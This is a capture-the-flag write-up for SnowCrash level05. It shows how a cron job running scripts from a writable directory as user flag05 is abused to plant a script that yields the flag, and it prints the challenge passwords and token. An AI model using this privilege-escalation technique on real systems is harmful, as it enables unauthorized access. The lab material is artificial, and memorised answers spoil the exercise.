## level05:

At this level, I also need to obtain the flag. Upon logging in, I noticed something strange: I received the message, 'You have new mail’.

```bash
~ ssh level05@10.13.100.136 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.13.100.136
level05@10.13.100.136's password:ne2searoevaevoem4ov4ar8ap
You have new mail.
level05@SnowCrash:~$
```

Now, I am going to search for the mail directory:

```bash
level05@SnowCrash:~$ find / -name mail 2> /dev/null
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
level05@SnowCrash:~$

```

Some of the directories related to mail contain a cron job. This cron job executes every 2 minutes:

```bash
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/*
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$

```

Every 2 minutes, the cron job executes the scripts located in the `/opt/openarenaserver/*` directory. I will create a script in this directory to obtain the flag (`getflag05`).

```bash
level05@SnowCrash:~$ echo '#!/bin/sh' > /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ echo '/bin/getflag > /tmp/flag05' >> /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ cat /opt/openarenaserver/getflag.sh
#!/bin/sh
/bin/getflag > /tmp/flag05
level05@SnowCrash:~$
```

After 2 minutes, I will check the contents of `/tmp/flag05` using the `cat` command.

```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$
```

The password for the next level is `viuaaale9huek52boumoomioc`.

```bash
level05@SnowCrash:~$ su level06
Password:viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```